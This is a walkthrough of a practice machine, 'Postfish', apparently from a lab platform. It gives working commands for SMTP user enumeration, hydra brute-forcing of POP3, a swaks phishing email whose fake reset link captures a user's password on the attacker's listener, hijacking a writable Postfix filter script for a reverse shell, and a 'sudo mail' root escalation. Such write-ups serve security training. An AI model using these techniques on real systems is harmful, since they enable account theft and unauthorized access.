---
icon: ubuntu
---

# Postfish - Intermediate

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.224.137 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-04 09:59 EDT
Nmap scan report for 192.168.224.137
Host is up (0.028s latency).
Not shown: 65528 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
25/tcp  open  smtp     Postfix smtpd
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2021-01-26T10:26:37
|_Not valid after:  2031-01-24T10:26:37
|_ssl-date: TLS randomness does not represent time
|_smtp-commands: postfish.off, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
80/tcp  open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: TOP PIPELINING SASL(PLAIN) UIDL RESP-CODES CAPA USER AUTH-RESP-CODE STLS
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2021-01-26T10:26:37
|_Not valid after:  2031-01-24T10:26:37
143/tcp open  imap     Dovecot imapd (Ubuntu)
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2021-01-26T10:26:37
|_Not valid after:  2031-01-24T10:26:37
|_imap-capabilities: SASL-IR Pre-login LITERAL+ post-login capabilities ENABLE listed more have AUTH=PLAINA0001 STARTTLS LOGIN-REFERRALS OK ID IMAP4rev1 IDLE
|_ssl-date: TLS randomness does not represent time
993/tcp open  ssl/imap Dovecot imapd (Ubuntu)
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2021-01-26T10:26:37
|_Not valid after:  2031-01-24T10:26:37
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: SASL-IR Pre-login LITERAL+ post-login listed capabilities more have AUTH=PLAINA0001 ENABLE LOGIN-REFERRALS OK ID IMAP4rev1 IDLE
995/tcp open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: TOP SASL(PLAIN) PIPELINING AUTH-RESP-CODE CAPA USER RESP-CODES UIDL
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2021-01-26T10:26:37
|_Not valid after:  2031-01-24T10:26:37
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: Host:  postfish.off; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1025/tcp)
HOP RTT      ADDRESS
1   25.77 ms 192.168.45.1
2   25.73 ms 192.168.45.254
3   25.84 ms 192.168.251.1
4   27.41 ms 192.168.224.137
```

### <mark style="color:$primary;">HTTP Port 80 TCP</mark>

Upon visiting the site we get a redirect. I'll add it to my /etc/hosts file

<figure><img src="../../.gitbook/assets/image (780).png" alt=""><figcaption></figcaption></figure>

```
192.168.224.137	postfish.off
```

<figure><img src="../../.gitbook/assets/image (781).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (782).png" alt=""><figcaption></figcaption></figure>

SMTP is one of the ports that came up during our initial scan. I'll use the names I found to generate a list of usernames using [**username-anarchy**](https://github.com/urbanadventurer/username-anarchy)

```
~/tools/username-anarchy/username-anarchy -i users | tee usernames
```

<figure><img src="../../.gitbook/assets/image (783).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">SMTP Enumeration</mark>

After building a custom **username list**, I proceeded with **SMTP enumeration** on port **25** using the tool `smtp-user-enum`

```
smtp-user-enum -M VRFY -U usernames -t 192.168.224.137
```

<figure><img src="../../.gitbook/assets/image (784).png" alt=""><figcaption></figcaption></figure>

The enumeration results revealed **4 valid SMTP users**.

I'll try some other possible usernames using a wordlist

```
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/namelist.txt -t 192.168.224.137
```

<figure><img src="../../.gitbook/assets/image (785).png" alt=""><figcaption></figcaption></figure>

I'll add all of these to a list of valid usernames

<figure><img src="../../.gitbook/assets/image (786).png" alt=""><figcaption></figcaption></figure>

Since the description of each user profile are in the website’s **team.html,** there might be a hidden password for a specific user in the page. We’ll use **cewl** to extract the texts in the **team.html** and perform a brute force login

```
cewl -d 5 http://postfish.off/team.html -w pop_passwords.txt
```

<figure><img src="../../.gitbook/assets/image (787).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Brute Force POP | | IMAP</mark>

```
hydra -L valid_usernames -P pop_passwords.txt 192.168.224.137 pop3 -V -f
```

<figure><img src="../../.gitbook/assets/image (788).png" alt=""><figcaption></figcaption></figure>

After running it, nothing was found. Then I tried running the usernames against each other.

```
hydra -L valid_usernames -P valid_usernames 192.168.224.137 pop3 -V -f
```

<figure><img src="../../.gitbook/assets/image (789).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (790).png" alt=""><figcaption></figcaption></figure>

We got **sales:sales** as a valid credential to login to POP3 or IMAP. We’ll use this to login to POP3 and attempt to retrieve any mails.

If this would have not worked either, we could have tried converting all passwords to lower case and redo the brute force attack

### <mark style="color:$primary;">POP3 Enumeration</mark>

```
telnet 192.168.224.137 110
```

<figure><img src="../../.gitbook/assets/image (791).png" alt=""><figcaption></figcaption></figure>

It seems that whoever belongs to the sales team will be receiving password reset links. From the website's teams.html, we can see that brian is from the sales team.

<figure><img src="../../.gitbook/assets/image (792).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Email Phishing</mark>

Start a netcat listener on port 80

Than send an email containing the following keywords: Password, Rest & Link

```
swaks --to brian.moore@postfish.off --from it@postfish.off --server 192.168.224.137 --body "reset password at this link http://192.168.45.158" --header "Subject: Password Reset"
```

<figure><img src="../../.gitbook/assets/image (793).png" alt=""><figcaption></figcaption></figure>

Notice password will be caught when brian tries to curl our URL and enters his password

<figure><img src="../../.gitbook/assets/image (794).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">SSH</mark>

Let's check if this user can ssh

```
netexec ssh 192.168.224.137 -u brian.moore -p EternaLSunshinE
```

<figure><img src="../../.gitbook/assets/image (795).png" alt=""><figcaption></figcaption></figure>

```
ssh brain.moore@192.168.224.137
```

<figure><img src="../../.gitbook/assets/image (796).png" alt=""><figcaption></figcaption></figure>

Interesting group!

## <mark style="color:blue;">Privilege Escalation</mark>

### <mark style="color:$primary;">Linpeas</mark>

<figure><img src="../../.gitbook/assets/image (797).png" alt=""><figcaption></figcaption></figure>

Linpeas revealed an interesting file

### <mark style="color:$primary;">Trigger Activated writable bash script</mark>

<figure><img src="../../.gitbook/assets/image (799).png" alt=""><figcaption></figcaption></figure>

```
#!/bin/bash
# Localize these.
INSPECT_DIR=/var/spool/filter       # Directory where emails are processed
SENDMAIL=/usr/sbin/sendmail         # Path to the sendmail binary

####### Changed From Original Script #######
DISCLAIMER_ADDRESSES=/etc/postfix/disclaimer_addresses   # File with addresses that need disclaimers
####### Changed From Original Script END #######

# Exit codes from <sysexits.h>
EX_TEMPFAIL=75        # Temporary failure exit code
EX_UNAVAILABLE=69     # Permanent failure exit code

# Clean up when done or when aborting.
trap "rm -f in.$$" 0 1 2 3 15       # Remove temp file on exit or interrupt

# Start processing.
cd $INSPECT_DIR || { echo $INSPECT_DIR does not exist; exit $EX_TEMPFAIL; }   # Change to processing dir or exit

cat >in.$$ || { echo Cannot save mail to file; exit $EX_TEMPFAIL; }           # Save incoming mail to temp file

####### Changed From Original Script #######
# obtain From address
from_address=`grep -m 1 "From:" in.$$ | cut -d "<" -f 2 | cut -d ">" -f 1`    # Extract sender email from "From:" header

if [ `grep -wi ^${from_address}$ ${DISCLAIMER_ADDRESSES}` ]; then            # Check if sender is in disclaimer list
  /usr/bin/altermime --input=in.$$ \                                         # Add disclaimer using altermime
                   --disclaimer=/etc/postfix/disclaimer.txt \
                   --disclaimer-html=/etc/postfix/disclaimer.txt \
                   --xheader="X-Copyrighted-Material: Please visit http://www.company.com/privacy.htm" || \
                    { echo Message content rejected; exit $EX_UNAVAILABLE; } # Exit if disclaimer adding fails
fi
####### Changed From Original Script END #######

$SENDMAIL "$@" <in.$$       # Send the (possibly modified) email using sendmail

exit $?                     # Exit with the status of the last command
```

It looks like it auto modified itself in the last 5 minutes I searched for cron jobs but none were targeting this file. It must have some sort of triggering mechanism.&#x20;

Note! Since we are in the filter group we have read write and execute on the file so we can arm it with a reverse shell

There is another interesting file containing 2 users

<figure><img src="../../.gitbook/assets/image (800).png" alt=""><figcaption></figcaption></figure>

This script seems to be checking and organizing received mails

but i do not see a crontab

I’m guessing that the /etc/postfix/disclaimer gets triggered everytime these users send or receive an email. We’ll test it out.

Let's modify the file to give us a reverse shell when it gets executed

<figure><img src="../../.gitbook/assets/image (801).png" alt=""><figcaption></figcaption></figure>

make sure to send the email quick because the script gets reset back to normal

```
swaks --to brian.moore@postfish.off --from it@postfish.off --server 192.168.224.137 --body "Hello"
```

<figure><img src="../../.gitbook/assets/image (802).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (803).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">**Sudo mail**</mark>

<figure><img src="../../.gitbook/assets/image (804).png" alt=""><figcaption></figcaption></figure>

[**Gtfobins**](https://gtfobins.github.io/gtfobins/mail/#sudo) reveals an easy privesc

<figure><img src="../../.gitbook/assets/image (805).png" alt=""><figcaption></figcaption></figure>

```
sudo mail --exec='!/bin/sh'
```

<figure><img src="../../.gitbook/assets/image (806).png" alt=""><figcaption></figcaption></figure>
